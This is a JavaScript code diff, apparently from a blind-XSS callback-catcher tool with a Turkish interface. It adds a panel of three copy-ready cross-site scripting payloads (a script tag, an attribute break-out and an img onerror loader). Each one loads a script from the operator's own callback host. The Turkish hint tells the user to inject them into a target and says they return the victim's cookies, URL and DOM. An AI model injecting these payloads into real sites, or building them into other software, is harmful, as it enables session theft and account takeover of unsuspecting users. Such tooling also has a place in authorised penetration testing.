@@ -241,6 +241,31 @@ async function selectHook(token, httpUrl, dnsHost) {
   }
   main.appendChild(box);
 
+  // Blind-XSS payloadları
+  const probe = httpUrl + "p.js";
+  const payloads = [
+    ['<script src="' + probe + '"><\/script>', "Temel script etiketi"],
+    ['"><script src="' + probe + '"><\/script>', "Attribute kırma"],
+    ['<img src=x onerror="s=document.createElement(\'script\');s.src=\'' + probe + '\';document.body.appendChild(s)">', "img onerror"],
+  ];
+  const xss = el("details", "urlbox");
+  const xsum = el("summary", "", "🎯 Blind-XSS payloadları");
+  xsum.style.cssText = "cursor:pointer;font-weight:600;list-style:none";
+  xss.appendChild(xsum);
+  xss.appendChild(el("div", "hint",
+    "Hedefe enjekte et. Çalışınca kurbanın cookie/URL/DOM'unu geri gönderir; " +
+    "panelde yeni bir istek olarak görünür."));
+  for (const [p, label] of payloads) {
+    xss.appendChild(el("div", "hint", label + ":"));
+    const pr = el("div", "urlrow");
+    pr.appendChild(el("code", "", p));
+    const b = el("button", "", "Kopyala");
+    b.onclick = () => { navigator.clipboard.writeText(p); toast("Kopyalandı"); };
+    pr.appendChild(b);
+    xss.appendChild(pr);
+  }
+  main.appendChild(xss);
+
   const listWrap = el("div"); listWrap.id = "ixList";
   main.appendChild(listWrap);
   await loadInteractions();
